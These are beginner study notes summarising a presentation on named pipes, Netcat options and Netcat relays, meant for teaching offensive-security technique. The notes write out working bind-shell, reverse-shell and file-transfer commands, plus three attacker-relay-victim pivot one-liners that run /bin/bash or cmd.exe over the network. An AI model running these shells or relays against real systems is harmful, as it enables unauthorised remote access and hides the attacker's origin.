# Netcat Relay — Beginner Notes

> These notes follow the presentation in order. Each concept is explained before moving to the next one.

---

# 1. Named Pipe

A **named pipe** is used to allow two separate processes to communicate with each other.

A named pipe appears in the filesystem like a file, but it does not work like a normal file.

For example, one process can use the pipe to send data, while another process can read that data.

```text
Process 1
   |
   | sends data
   ↓
Named Pipe
   |
   | reads data
   ↓
Process 2
```

The presentation says that a named pipe normally appears to have **0 bytes** of contents.

Once the pipe has been read, the data is gone, but the named pipe itself is still there and can be used again.

---

## Creating a Named Pipe

A named pipe can be created using `mknod`.

```bash
mknod /tmp/mypipe p
```

### Breaking down the command

```text
mknod
```

Creates a special file.

```text
/tmp/mypipe
```

This is the location and name of the pipe.

* `/tmp` = directory where the pipe is created
* `mypipe` = name given to the pipe

```text
p
```

Tells `mknod` to create the special file as a **pipe**.

So:

```bash
mknod /tmp/mypipe p
```

means:

> Create a named pipe called `mypipe` inside the `/tmp` directory.

The presentation also mentions `mkfifo` as another command that can be used to create a named pipe.

---

# 2. Some Remarks About Named Pipes

The presentation makes a few important points about named pipes.

### Root privileges

You do **not** need root privileges to create a named pipe as long as you have permission to write to the directory where you are creating it.

### `/tmp`

The presentation says `/tmp` is usually used because it has world-wide writing privileges.

So this is why examples commonly use:

```text
/tmp/mypipe
```

### Checking the pipe

A named pipe can be seen when listing a directory.

The presentation says that when you use a long listing, a named pipe is displayed starting with the letter:

```text
p
```

---

# 3. `ls -l`

The command used to list files is:

```bash
ls
```

The `-l` option gives a **long listing**.

So:

```bash
ls -l
```

shows more information about the files instead of only their names.

For example, you may see something like:

```text
prw-r--r-- 1 user user 0 ... mypipe
```

The important part for our named pipe is the first character:

```text
p
```

This indicates that `mypipe` is a **named pipe**.

So, for this topic:

```text
ls
↓
lists files

ls -l
↓
shows detailed information

p at the beginning
↓
named pipe
```

---

# 4. Netcat (`nc`)

Now the presentation moves to **Netcat**.

Netcat is represented by the command:

```bash
nc
```

The presentation describes Netcat as the **"Swiss army knife of TCP/IP connections."**

The basic idea is that Netcat can take data from your computer and send it across a network.

It can also receive data from the network and send that data to your computer's standard output.

The basic flow is:

```text
Your Computer
     |
     | Standard Input
     ↓
   Netcat
     |
     | Network
     ↓
   Netcat
     |
     | Standard Output
     ↓
Other Computer
```

---

# 5. Netcat Input

Netcat takes whatever comes through **Standard Input** and sends it across the network.

The presentation gives three possible sources of input.

### Keyboard

You can type directly into Netcat.

```text
Keyboard
   ↓
Netcat
   ↓
Network
```

### File

Input can come from a file:

```bash
nc [options] < [file]
```

The `<` means that the input comes from the file.

```text
File
 ↓
Netcat
 ↓
Network
```

### Another program

Input can also come from another program:

```bash
[program] | nc [options]
```

Here, the output from the first program becomes the input for Netcat.

```text
Program
   ↓
 Netcat
   ↓
Network
```

---

# 6. Netcat Output

When Netcat receives data from the network, it places that data on **Standard Output**.

The output can go to different places.

### Screen

Normally, you can see the output on the screen.

```text
Network
   ↓
Netcat
   ↓
Screen
```

### File

Output can be redirected to a file:

```bash
nc [options] > [file]
```

The `>` means that the output is sent to the file.

```text
Network
   ↓
Netcat
   ↓
File
```

### Another program

Netcat's output can also be sent to another program:

```bash
nc [options] | [program]
```

The output from Netcat becomes the input for the other program.

---

# 7. Netcat Options

The presentation introduces several Netcat options.

## `-l`

```bash
-l
```

Means **listen mode**.

Instead of initiating a connection, Netcat waits for another machine to connect.

---

## `-L`

```bash
-L
```

The presentation specifies this for the **Windows version** of Netcat.

It causes Netcat to listen again after a client disconnects.

---

## `-u`

```bash
-u
```

Means **UDP mode**.

The presentation states that TCP is the default, while `-u` changes Netcat to UDP.

---

## `-p`

```bash
-p
```

Specifies the port.

For example:

```bash
-p 4444
```

means port `4444`.

---

## `-d`

```bash
-d
```

Runs Netcat in the background, detached from the console.

---

## `-e`

```bash
-e
```

Tells Netcat to execute a program after a connection occurs.

The presentation uses `/bin/bash` and `cmd.exe` in later shell examples.

---

## `-n`

```bash
-n
```

Tells Netcat not to resolve the names of machines on the other side.

---

## `-z`

```bash
-z
```

Means **zero I/O mode**.

The presentation explains that in TCP mode it can complete the connection handshake without normal data transfer.

---

## `-wN`

```bash
-wN
```

Sets a timeout in seconds.

For example:

```bash
-w5
```

means a 5-second timeout.

---

# 8. Client and Listener

There are two important sides of a Netcat connection.

## Client

A **client initiates the connection**.

The presentation gives:

```bash
nc -nv [targetIP] [remote_port]
```

The client is essentially saying:

> "I want to connect to this IP address and port."

---

## Listener

A **listener waits for a connection**.

The presentation gives:

```bash
nc -lvp [local_port]
```

The listener is essentially saying:

> "I am waiting for someone to connect to this port."

---

## Simple Picture

```text
Client                         Listener
   |                               |
   | -------- connection --------> |
   |                               |
```

Remember:

```text
Client = initiates

Listener = waits
```

---

# 9. Ports

Netcat connections use **ports**.

A port is a number used to identify a particular network endpoint on a machine.

For example:

```text
192.168.1.2:4444
```

Here:

```text
192.168.1.2
     ↓
IP address

4444
     ↓
Port
```

The presentation uses different ports in its examples, such as:

```text
2222
4444
1234
```

---

# 10. Bind Shell

The presentation next shows how Netcat can be used to create a **bind shell**.

A bind shell has the target machine **listening for the connection**.

### Target

```bash
nc -lvp 4444 -e /bin/bash
```

### Attacker

```bash
nc -nv 192.168.1.2 4444
```

The basic idea is:

```text
Attacker
   |
   | connects
   ↓
Target
   |
   | listens on port 4444
   ↓
Shell
```

The `-e /bin/bash` part tells Netcat to execute `/bin/bash` after the connection occurs.

The Windows example in the presentation uses:

```cmd
-e cmd.exe
```

---

# 11. Reverse Shell

A reverse shell works in the opposite direction.

Instead of the target waiting for the attacker to connect, the **target connects back to the attacker**.

### Target

```bash
nc -nv 198.168.1.1 4444 -e /bin/bash
```

### Attacker

```bash
nc -lvp 4444
```

The basic idea is:

```text
Target
   |
   | connects back
   ↓
Attacker
   |
   | listening
   ↓
Shell
```

### Easy way to remember

```text
Bind Shell
Target listens
Attacker connects


Reverse Shell
Attacker listens
Target connects
```

The presentation's diagram shows the reverse-shell example in a situation where inbound connections are blocked but outbound traffic on the relevant port is allowed.

---

# 12. Moving Files Using Netcat

Netcat can also be used to transfer a file between machines.

The presentation gives this example.

### Machine 1

```bash
nc -lvp 1234 > /tmp/netcatfile
```

Machine 1 listens on port `1234`.

The `>` sends the received data into:

```text
/tmp/netcatfile
```

### Machine 2

```bash
nc 192.168.20.9 1234 < /tmp/myfile
```

Machine 2 takes the contents of:

```text
/tmp/myfile
```

and sends them to Machine 1.

### Data flow

```text
Machine 2

/tmp/myfile
     |
     ↓
   Netcat
     |
     ↓
  Network
     |
     ↓
   Netcat
     |
     ↓
Machine 1

/tmp/netcatfile
```

So the file moves from **Machine 2 → Machine 1**.

---

# 13. Netcat Relay

Now we reach the main topic: **Netcat Relay**.

A relay is a machine in the middle that passes data between two connections.

Instead of:

```text
Attacker → Victim
```

we have:

```text
Attacker → Relay → Victim
```

The relay has to deal with two separate Netcat connections.

The presentation uses a named pipe called:

```text
backpipe
```

The named pipe allows the two Netcat processes on the relay machine to pass data between their connections.

---

# 14. Relay Case #1 — Listener-Client Relay

The first relay example is:

**Listener-Client Relay on Linux**

There are three machines:

```text
Attacker
    |
    ↓
  Relay
    |
    ↓
  Victim
```

### Attacker

```bash
nc -nv Relay's_IP 2222
```

The attacker is acting as a **client** and connects to the relay.

### Relay

First create the named pipe:

```bash
mknod backpipe p
```

Then:

```bash
nc -l -p 2222 0<backpipe | nc Victim's_IP 4444 1>backpipe
```

The relay is using two Netcat processes.

The first listens on port `2222`.

The second connects to the victim on port `4444`.

### Victim

Linux:

```bash
nc -l -p 4444 -e /bin/bash
```

Windows:

```cmd
nc -l -p 4444 -e cmd.exe
```

The overall idea is:

```text
Attacker
   |
   | connects to relay :2222
   ↓
Relay
   |
   | connects to victim :4444
   ↓
Victim
```

The named pipe is used by the relay to pass the data between its two Netcat processes.

---

# 15. Relay Case #2 — Client-Client Relay

The second example is:

**Client-Client Relay on Linux**

### Attacker

```bash
nc -l -p 2222
```

The attacker is listening on port `2222`.

### Relay

Create the pipe:

```bash
mknod backpipe p
```

Then:

```bash
nc Attacker's_IP 2222 0<backpipe | nc Victim's_IP 4444 1>backpipe
```

The relay makes connections to both sides.

### Victim

Linux:

```bash
nc -l -p 4444 -e /bin/bash
```

Windows:

```cmd
nc -l -p 4444 -e cmd.exe
```

The basic layout is:

```text
Attacker
   ↑
   | connection
   |
 Relay
   |
   | connection
   ↓
Victim
```

The important difference is that the attacker side is now listening.

---

# 16. Relay Case #3 — Listener-Listener Relay

The third example is:

**Listener-Listener Relay on Linux**

### Attacker

```bash
nc -nv Relay's_IP 2222
```

### Relay

Create the named pipe:

```bash
mknod backpipe p
```

Then:

```bash
nc -l -p 2222 0<backpipe | nc -l -p 4444 | tee backpipe
```

The relay has listeners on:

```text
Port 2222
Port 4444
```

### Victim

Windows:

```bash
nc -nv Relay's_IP 4444 -e cmd.exe
```

Linux:

```bash
nc -nv Relay's_IP 4444 -e /bin/bash
```

---

# 17. `tee`

The third relay example introduces:

```bash
tee
```

The presentation explains that `tee` allows the output of a program to be both **displayed and saved/passed onward**.

Think of it like splitting the output:

```text
             → Output A
             |
Input → tee ─┤
             |
             → Output B
```

In the third relay example, `tee` is used with `backpipe` to help pass the data through the relay.

---

# Quick Revision

```text
NAMED PIPE
A special file used for communication between processes.

mknod
Command used to create a special file.

mknod /tmp/mypipe p
Creates a named pipe called mypipe in /tmp.

p
Means pipe when used with mknod.

ls
Lists files and directories.

ls -l
Shows files in long listing format.

p at the beginning of ls -l output
Shows that the object is a named pipe.

NETCAT
Command: nc

-l
Listen mode.

-u
UDP mode.

-p
Specify port.

-e
Execute a program after a connection.

-n
Do not resolve names.

-z
Zero-I/O mode.

-wN
Timeout.

CLIENT
Initiates a connection.

LISTENER
Waits for a connection.

BIND SHELL
Target listens.
Attacker connects.

REVERSE SHELL
Attacker listens.
Target connects back.

FILE TRANSFER
Netcat can take a file as input and send it across a network.

RELAY
A middle machine that passes data between two network connections.

backpipe
The named pipe used in the relay examples.

CASE #1
Listener-Client Relay.

CASE #2
Client-Client Relay.

CASE #3
Listener-Listener Relay.

tee
Allows output to be passed to more than one destination.
```

**Source:** Netcat Relay presentation. 
